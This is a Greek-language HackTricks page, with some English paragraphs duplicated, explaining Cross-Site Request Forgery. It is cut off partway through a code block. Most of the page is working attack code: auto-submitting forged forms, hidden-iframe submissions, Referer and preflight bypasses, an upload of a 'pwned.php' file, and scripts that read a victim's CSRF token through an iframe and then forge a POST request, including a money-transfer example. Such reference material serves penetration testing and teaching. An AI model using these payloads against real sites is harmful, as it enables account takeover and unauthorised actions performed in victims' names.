# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Εγγραφείτε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ανακοινώσεις για τις ευρήματα ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**


## Εξήγηση Cross-Site Request Forgery (CSRF)

Το **Cross-Site Request Forgery (CSRF)** είναι ένας τύπος ευπάθειας ασφάλειας που βρίσκεται σε ιστοσελίδες. Επιτρέπει στους επιτιθέμενους να εκτελούν ενέργειες εξ ονόματος ανυποψίαστων χρηστών εκμεταλλευόμενοι τις εξουσιοδοτημένες συνεδρίες τους. Η επίθεση εκτελείται όταν ένας χρήστης, που έχει συνδεθεί σε μια πλατφόρμα θύματος, επισκέπτεται μια κακόβουλη ιστοσελίδα. Αυτή η ιστοσελίδα στη συνέχεια ενεργοποιεί αιτήματα προς τον λογαριασμό του θύματος μέσω μεθόδων όπως η εκτέλεση JavaScript, η υποβολή φορμών ή η λήψη εικόνων.

### Προαπαιτούμενα για μια επίθεση CSRF
Για να εκμεταλλευτείτε μια ευπάθεια CSRF, πρέπει να πληρούνται αρκετές προϋποθέσεις:

1. **Εντοπίστε μια Πολύτιμη Ενέργεια**: Ο επιτιθέμενος πρέπει να βρει μια ενέργεια που αξίζει να εκμεταλλευτεί, όπως η αλλαγή του κωδικού πρόσβασης του χρήστη, του email ή η αύξηση των δικαιωμάτων.
2. **Διαχείριση Συνεδριών**: Η συνεδρία του χρήστη πρέπει να διαχειρίζεται αποκλειστικά μέσω cookies ή της κεφαλίδας HTTP Basic Authentication, καθώς άλλες κεφαλίδες δεν μπορούν να χειριστούν για αυτόν τον σκοπό.
3. **Απουσία Απρόβλεπτων Παραμέτρων**: Το αίτημα δεν πρέπει να περιέχει απρόβλεπτες παραμέτρους, καθώς αυτές μπορούν να εμποδίσουν την επίθεση.

### Προστασία από CSRF
Μπορ
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Σημείωση ότι αν το **csrf token σχετίζεται με το session cookie αυτή η επίθεση δεν θα λειτουργήσει** επειδή θα χρειαστεί να ορίσετε στο θύμα το session σας και, συνεπώς, θα επιτεθείτε στον εαυτό σας.
{% endhint %}

### Αλλαγή του Content-Type

Σύμφωνα με [**αυτό**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), για να **αποφευχθούν οι προερωτήσεις** αιτήσεων χρησιμοποιώντας τη μέθοδο **POST**, αυτές είναι οι επιτρεπτές τιμές του Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Ωστόσο, σημειώστε ότι η **λογική του διακομιστή μπορεί να διαφέρει** ανάλογα με το **Content-Type** που χρησιμοποιείται, επομένως θα πρέπει να δοκιμάσετε τις αναφερόμενες τιμές και άλλες όπως **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Παράδειγμα (από [εδώ](https://brycec.me/posts/corctf\_2021\_challenges)) αποστολής δεδομένων JSON ως text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Παράκαμψη αιτημάτων προεπισκόπησης για δεδομένα JSON

Όταν προσπαθείτε να στείλετε δεδομένα JSON μέσω ενός αιτήματος POST, δεν είναι δυνατή η χρήση του `Content-Type: application/json` απευθείας σε ένα HTML φόρμα. Αντίστοιχα, η χρήση του `XMLHttpRequest` για την αποστολή αυτού του τύπου περιεχομένου προκαλεί ένα αίτημα προεπισκόπησης. Ωστόσο, υπάρχουν στρατηγικές για πιθανή παράκαμψη αυτού του περιορισμού και έλεγχος εάν ο διακομιστής επεξεργάζεται τα δεδομένα JSON ανεξάρτητα από το Content-Type:

1. **Χρήση εναλλακτικών τύπων περιεχομένου**: Χρησιμοποιήστε `Content-Type: text/plain` ή `Content-Type: application/x-www-form-urlencoded` ορίζοντας `enctype="text/plain"` στη φόρμα. Με αυτήν την προσέγγιση ελέγχεται εάν ο διακομιστής χρησιμοποιεί τα δεδομένα ανεξάρτητα από το Content-Type.

2. **Τροποποίηση του Content-Type**: Για να αποφευχθεί ένα αίτημα προεπισκόπησης ενώ εξασφαλίζεται ότι ο διακομιστής αναγνωρίζει το περιεχόμενο ως JSON, μπορείτε να στείλετε τα δεδομένα με το `Content-Type: text/plain; application/json`. Αυτό δεν προκαλεί ένα αίτημα προεπισκόπησης, αλλά μπορεί να επεξεργαστεί σωστά από τον διακομιστή εάν είναι ρυθμισμένος να αποδέχεται `application/json`.

3. **Χρήση αρχείου SWF Flash**: Μια λιγότερο κοινή αλλά εφικτή μέθοδος περιλαμβάνει τη χρήση ενός αρχείου SWF flash για την παράκαμψη τέτοιων περιορισμών. Για μια λεπτομερή κατανόηση αυτής της τεχνικής, ανατρέξτε στην [ανάρτηση αυτή](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Παράκαμψη έλεγχου Referrer / Origin

**Αποφυγή του κεφαλίδας Referrer**

Οι εφαρμογές μπορεί να επικυρώνουν τον κεφαλίδα 'Referer' μόνο όταν είναι παρόν. Για να αποτρέψετε ένα πρόγραμμα περιήγησης από το να στείλει αυτήν την κεφαλίδα, μπορεί να χρησιμοποιηθεί η ακόλουθη ετικέτα meta HTML:
```xml
<meta name="referrer" content="never">
```
Αυτό εξασφαλίζει ότι ο κεφαλίδα 'Referer' παραλείπεται, παρακάμπτοντας έτσι τους ελέγχους επικύρωσης σε ορισμένες εφαρμογές.

**Παράκαμψη με χρήση της έκφρασης regular expression (Regexp)**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Για να ορίσετε το όνομα του τομέα του διακομιστή στο URL που θα σταλεί από τον αναφέροντα (Referrer) μέσα στις παραμέτρους, μπορείτε να κάνετε:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Παράκαμψη μεθόδου HEAD**

Στο πρώτο μέρος [**αυτού του CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) εξηγείται ότι [ο κώδικας πηγής του Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), ένας router έχει οριστεί να **χειρίζεται τα αιτήματα HEAD ως GET αιτήματα** χωρίς σώμα απάντησης - μια συνηθισμένη λύση που δεν είναι μοναδική για το Oak. Αντί για έναν συγκεκριμένο χειριστή που ασχολείται με τα αιτήματα HEAD, απλά **δίνονται στον χειριστή GET αλλά η εφαρμογή απλά αφαιρεί το σώμα της απάντησης**.

Επομένως, αν ένα αίτημα GET περιορίζεται, μπορείτε απλά να **στείλετε ένα αίτημα HEAD που θα επεξεργαστείται ως αίτημα GET**.

## **Παραδείγματα Εκμετάλλευσης**

### **Εξαγωγή CSRF Token**

Αν χρησιμοποιείται ένας **CSRF token** ως **μέτρο προστασίας**, μπορείτε να προσπαθήσετε να τον **εξαγάγετε** καταχρώντας μια ευπάθεια [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ή μια ευπάθεια [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET χρησιμοποιώντας ετικέτες HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Άλλες ετικέτες HTML5 που μπορούν να χρησιμοποιηθούν για να στείλουν αυτόματα ένα αίτημα GET είναι:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Αίτηση GET με φόρμα

Όταν μια φόρμα χρησιμοποιείται για να αποσταλεί μια αίτηση GET, τα δεδομένα της φόρμας περνούν ως παράμετροι στο URL. Αυτό σημαίνει ότι τα δεδομένα είναι ορατά στο URL και μπορούν να εκμεταλλευτούν από επιτιθέμενους.

Για παράδειγμα, ένα URL με μια αίτηση GET μπορεί να φαίνεται κάπως έτσι:

```
https://example.com/search?query=hacking&category=security
```

Σε αυτό το παράδειγμα, η φόρμα αναζήτησης στέλνει μια αίτηση GET με δύο παραμέτρους: "query" και "category". Οι τιμές των παραμέτρων είναι "hacking" και "security" αντίστοιχα.

Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτήν την αδυναμία ασφάλειας για να προκαλέσουν CSRF (Cross-Site Request Forgery) επιθέσεις. Με αυτές τις επιθέσεις, οι επιτιθέμενοι μπορούν να παραπλανήσουν τους χρήστες να εκτελέσουν ανεπιθύμητες ενέργειες στο όνομά τους, χρησιμοποιώντας την αυθεντικοποίηση τους σε έναν άλλο ιστότοπο.

Για να προστατευτείτε από αυτούς τους τύπους επιθέσεων, μπορείτε να χρησιμοποιήσετε τεχνικές όπως η χρήση τυχαίων και μοναδικών τιμών για τις παραμέτρους, η χρήση του HTTP POST αντί για το GET για ευαίσθητες ενέργειες και η χρήση του CSRF token για την επαλήθευση της αυθεντικότητας των αιτήσεων.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Αίτηση POST φόρμας

Μια αίτηση POST φόρμας είναι μια αίτηση HTTP που χρησιμοποιείται για να υποβάλει δεδομένα από έναν χρήστη σε μια ιστοσελίδα. Αυτή η αίτηση συνήθως περιλαμβάνει ένα σώμα δεδομένων που περιέχει τις τιμές των πεδίων της φόρμας.

Για να πραγματοποιηθεί μια αίτηση POST φόρμας, ο χρήστης πρέπει να συμπληρώσει τη φόρμα με τα απαιτούμενα δεδομένα και να πατήσει το κουμπί υποβολής. Οι πληροφορίες από τη φόρμα στη συνέχεια συσκευάζονται σε ένα σώμα δεδομένων και αποστέλλονται στον διακομιστή μέσω μιας αίτησης POST.

Οι αίτησεις POST φόρμας είναι συχνά χρήσιμες για την υποβολή δεδομένων όπως ονόματα χρηστών, κωδικοί πρόσβασης, ηλεκτρονικά μηνύματα και άλλες πληροφορίες που απαιτούνται για την εκτέλεση ενεργειών σε μια ιστοσελίδα.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Αίτηση POST φόρμας μέσω iframe

Μια από τις τεχνικές που μπορεί να χρησιμοποιηθεί για να εκτελεστεί μια επίθεση Cross-Site Request Forgery (CSRF) είναι η αποστολή μιας αίτησης POST μέσω ενός iframe. Αυτή η τεχνική εκμεταλλεύεται την ικανότητα των ιφρέιμ να φορτώνουν περιεχόμενο από διαφορετικές πηγές.

Για να εκτελεστεί αυτή η επίθεση, ο επιτιθέμενος δημιουργεί ένα ιφρέιμ που περιέχει μια φόρμα με τα απαραίτητα πεδία για την αίτηση POST. Στη συνέχεια, το ιφρέιμ φορτώνεται σε μια ιστοσελίδα που είναι εμπιστευτική για τον χρήστη, όπως μια σελίδα που απαιτεί σύνδεση.

Όταν ο χρήστης επισκέπτεται την εμπιστευτική ιστοσελίδα, το ιφρέιμ φορτώνεται και η φόρμα αυτόματα υποβάλλεται χωρίς τη συγκατάθεση του χρήστη. Αυτό οδηγεί στην αποστολή μιας ανεπιθύμητης αίτησης POST στον προορισμό της επίθεσης, που μπορεί να έχει αρνητικές συνέπειες για τον χρήστη.

Για να προστατευθεί ένας ιστότοπος από αυτού του είδους τις επιθέσεις, μπορούν να ληφθούν μέτρα όπως η χρήση τυχαίων, μοναδικών τιμών (CSRF tokens) για κάθε φόρμα, η επαλήθευση της προέλευσης των αιτήσεων (Origin header) και η χρήση του SameSite attribute για τα cookies.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Αίτηση Ajax POST**

Μια αίτηση Ajax POST είναι μια αίτηση που γίνεται μέσω της τεχνολογίας Ajax και χρησιμοποιεί τη μέθοδο POST για να στείλει δεδομένα σε έναν διακομιστή. Αυτή η αίτηση μπορεί να χρησιμοποιηθεί για να εκτελέσει επιθέσεις CSRF (Cross-Site Request Forgery) σε μια ιστοσελίδα.

Οι επιθέσεις CSRF συμβαίνουν όταν ένας επιτιθέμενος εξαναγκάζει έναν χρήστη να κάνει μια αίτηση σε μια ιστοσελίδα χωρίς τη συναίνεσή του. Αυτό μπορεί να γίνει μέσω ενός κακόβουλου συνδέσμου ή ενός κακόβουλου κώδικα που ενσωματώνεται σε μια ιστοσελίδα.

Για να προστατευθείτε από επιθέσεις CSRF, μπορείτε να χρησιμοποιήσετε μηχανισμούς προστασίας όπως τον έλεγχο προέλευσης (origin) και τον έλεγχο τυχαιότητας (CSRF token). Ο έλεγχος προέλευσης ελέγχει αν η αίτηση προέρχεται από την ίδια την ιστοσελίδα, ενώ ο έλεγχος τυχαιότητας χρησιμοποιεί ένα τυχαίο και μοναδικό κλειδί για να επιβεβαιώσει την αυθεντικότητα της αίτησης.

Είναι σημαντικό να εφαρμόζετε τις κατάλληλες πρακτικές ασφαλείας για να προστατεύσετε τις ιστοσελίδες σας από επιθέσεις CSRF και να διατηρείτε την ασφάλεια των χρηστών σας.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data αίτημα POST

Το `multipart/form-data` είναι ένας τύπος αίτηματος POST που χρησιμοποιείται για την αποστολή δεδομένων μέσω ενός φόρμας σε μια ιστοσελίδα. Αυτός ο τύπος αιτήματος επιτρέπει την αποστολή δεδομένων που περιλαμβάνουν αρχεία, όπως εικόνες ή βίντεο.

Για να δημιουργήσετε ένα αίτημα `multipart/form-data`, πρέπει να δημιουργήσετε ένα αντικείμενο `FormData` στον κώδικά σας και να προσθέσετε τα πεδία δεδομένων που θέλετε να αποστείλετε. Κάθε πεδίο δεδομένων πρέπει να έχει ένα όνομα και μια τιμή.

Για παράδειγμα, ο παρακάτω κώδικας δημιουργεί ένα αίτημα `multipart/form-data` με ένα πεδίο δεδομένων με όνομα "username" και την τιμή "admin":

```html
<form action="/upload" method="post" enctype="multipart/form-data">
  <input type="text" name="username" value="admin">
  <input type="file" name="file">
  <input type="submit" value="Submit">
</form>
```

Όταν το αίτημα αποσταλεί στον διακομιστή, τα δεδομένα θα είναι διαθέσιμα για επεξεργασία. Ο διακομιστής μπορεί να αποθηκεύσει τα αρχεία που αποστέλλονται και να χρησιμοποιήσει τα υπόλοιπα δεδομένα για επεξεργασία ή αποθήκευση σε μια βάση δεδομένων.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST αίτηση v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Αίτηση POST φόρμας από εντός ενός iframe

Όταν βρίσκεστε σε μια ιστοσελίδα που περιέχει ένα iframe, μπορείτε να χρησιμοποιήσετε το iframe για να στείλετε μια αίτηση POST από την ιστοσελίδα που περιέχει το iframe. Αυτό μπορεί να είναι χρήσιμο για την εκτέλεση επιθέσεων Cross-Site Request Forgery (CSRF).

Για να πραγματοποιήσετε μια αίτηση POST από ένα iframe, πρέπει να δημιουργήσετε ένα form element μέσα στο iframe και να το υποβάλετε. Αυτό μπορεί να γίνει με τη χρήση JavaScript.

Παρακάτω παρουσιάζεται ένα παράδειγμα κώδικα για την αποστολή μιας αίτησης POST από ένα iframe:

```html
<iframe id="myIframe" src="https://www.example.com"></iframe>

<script>
  // Αναζητήστε το iframe με βάση το id
  var iframe = document.getElementById("myIframe");

  // Δημιουργήστε ένα form element
  var form = document.createElement("form");
  form.setAttribute("method", "POST");
  form.setAttribute("action", "https://www.example.com/post-endpoint");

  // Προσθέστε τα πεδία της φόρμας
  var input1 = document.createElement("input");
  input1.setAttribute("type", "hidden");
  input1.setAttribute("name", "param1");
  input1.setAttribute("value", "value1");
  form.appendChild(input1);

  var input2 = document.createElement("input");
  input2.setAttribute("type", "hidden");
  input2.setAttribute("name", "param2");
  input2.setAttribute("value", "value2");
  form.appendChild(input2);

  // Προσθέστε τη φόρμα στο iframe
  iframe.contentDocument.body.appendChild(form);

  // Υποβάλετε τη φόρμα
  form.submit();
</script>
```

Στον παραπάνω κώδικα, το iframe με το id "myIframe" περιέχει ένα form element που υποβάλλεται αυτόματα. Οι παράμετροι της φόρμας (param1 και param2) περιέχουν τις τιμές "value1" και "value2" αντίστοιχα. Η αίτηση POST αποστέλλεται στο "https://www.example.com/post-endpoint".

Με αυτόν τον τρόπο, μπορείτε να πραγματοποιήσετε μια αίτηση POST από ένα iframe και να εκμεταλλευτείτε τυχόν ευπάθειες CSRF που μπορεί να υπάρχουν στην ιστοσελίδα.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Κλέψτε το CSRF Token και στείλτε ένα αίτημα POST**

To steal the CSRF Token, you can use various techniques such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF) attacks. Once you have obtained the token, you can then use it to craft a malicious POST request.

Για να κλέψετε το CSRF Token, μπορείτε να χρησιμοποιήσετε διάφορες τεχνικές όπως Cross-Site Scripting (XSS) ή Cross-Site Request Forgery (CSRF) επιθέσεις. Αφού αποκτήσετε το token, μπορείτε να το χρησιμοποιήσετε για να δημιουργήσετε ένα κακόβουλο αίτημα POST.

```html
<form action="https://example.com/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="stolen_token">
  <input type="hidden" name="amount" value="1000000">
  <input type="submit" value="Transfer Money">
</form>
```

The above HTML code represents a simple form that sends a POST request to `https://example.com/transfer`. It includes two hidden input fields: `csrf_token` and `amount`. The `csrf_token` field should contain the stolen CSRF token, while the `amount` field can be set to any desired value.

Ο παραπάνω κώδικας HTML αναπαριστά ένα απλό φόρμα που στέλνει ένα αίτημα POST στο `https://example.com/transfer`. Περιλαμβάνει δύο κρυφά πεδία εισόδου: `csrf_token` και `amount`. Το πεδίο `csrf_token` πρέπει να περιέχει το κλεμμένο CSRF token, ενώ το πεδίο `amount` μπορεί να οριστεί σε οποιαδήποτε επιθυμητή τιμή.

When the form is submitted, the POST request will be sent to the specified URL with the stolen CSRF token and the desired amount. This can lead to unauthorized actions being performed on behalf of the victim, such as transferring a large amount of money in this example.

Όταν υποβάλλεται η φόρμα, το αίτημα POST θα σταλεί στον καθορισμένο URL με το κλεμμένο CSRF token και το επιθυμητό ποσό. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένες ενέργειες που θα πραγματοποιηθούν εξ ονόματος του θύματος, όπως η μεταφορά μεγάλου ποσού χρημάτων σε αυτό το παράδειγμα.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Κλέψτε το CSRF Token και στείλτε ένα αίτημα Post χρησιμοποιώντας ένα iframe, ένα φόρμα και το Ajax**

Για να κλέψετε το CSRF Token και να στείλετε ένα αίτημα Post, μπορείτε να χρησιμοποιήσετε ένα iframe, μια φόρμα και το Ajax. Ακολουθήστε τα παρακάτω βήματα:

1. Δημιουργήστε ένα iframe στη σελίδα σας, το οποίο θα φορτώνει τη σελίδα που περιέχει το CSRF Token που θέλετε να κλέψετε.
```html
<iframe id="csrfFrame" src="https://example.com"></iframe>
```

2. Χρησιμοποιήστε το JavaScript για να πάρετε το CSRF Token από το iframe και να το αποθηκεύσετε σε μια μεταβλητή.
```javascript
var csrfToken = document.getElementById('csrfFrame').contentWindow.document.getElementsByName('csrf_token')[0].value;
```

3. Δημιουργήστε μια φόρμα στη σελίδα σας με το απαραίτητο CSRF Token που κλέψατε.
```html
<form id="csrfForm" action="https://example.com" method="POST">
  <input type="hidden" name="csrf_token" value="">
</form>
```

4. Χρησιμοποιήστε το JavaScript για να ανανεώσετε την τιμή του CSRF Token στη φόρμα που δημιουργήσατε.
```javascript
document.getElementById('csrfForm').getElementsByTagName('input')[0].value = csrfToken;
```

5. Χρησιμοποιήστε το Ajax για να στείλετε το αίτημα Post με τον κλεμμένο CSRF Token.
```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://example.com', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(new FormData(document.getElementById('csrfForm')));
```

Με αυτόν τον τρόπο, θα κλέψετε το CSRF Token και θα στείλετε ένα αίτημα Post χρησιμοποιώντας ένα iframe, μια φόρμα και το Ajax.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Κλέψτε το CSRF Token και στείλτε ένα αίτημα POST χρησιμοποιώντας ένα iframe και ένα φόρμα**

To steal the CSRF Token and send a POST request using an iframe and a form, you can follow these steps:

1. Create an iframe element in your HTML code:
```html
<iframe id="csrfFrame" style="display:none;"></iframe>
```

2. Use JavaScript to dynamically generate a form with the necessary fields, including the stolen CSRF Token:
```html
<script>
    var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
    var form = document.createElement('form');
    form.action = 'https://example.com/endpoint';
    form.method = 'POST';
    form.target = 'csrfFrame';

    var input1 = document.createElement('input');
    input1.type = 'hidden';
    input1.name = 'csrf_token';
    input1.value = csrfToken;
    form.appendChild(input1);

    // Add any other necessary form fields

    document.body.appendChild(form);
    form.submit();
</script>
```

3. Make sure to replace `'https://example.com/endpoint'` with the actual URL of the target endpoint where you want to send the forged request.

4. The hidden iframe (`csrfFrame`) will be used to submit the form silently, without the user's knowledge.

By stealing the CSRF Token and using it in the forged POST request, you can bypass CSRF protection mechanisms and perform unauthorized actions on behalf of the victim user.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Κλέψτε το token και στείλτε το χρησιμοποιώντας 2 iframes**

To steal a CSRF token and send it using 2 iframes, you can follow these steps:

1. Create an HTML page with two iframes.
2. Load the target website in one of the iframes.
3. Extract the CSRF token from the target website using JavaScript.
4. Send the stolen CSRF token to your server using the second iframe.
5. On your server, store the stolen CSRF token for later use.
6. Use the stolen CSRF token to perform unauthorized actions on the target website.

By using this technique, you can bypass CSRF protection mechanisms and perform actions on behalf of the victim without their knowledge or consent. It is important to note that CSRF attacks are illegal and unethical unless performed with proper authorization for legitimate security testing purposes.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
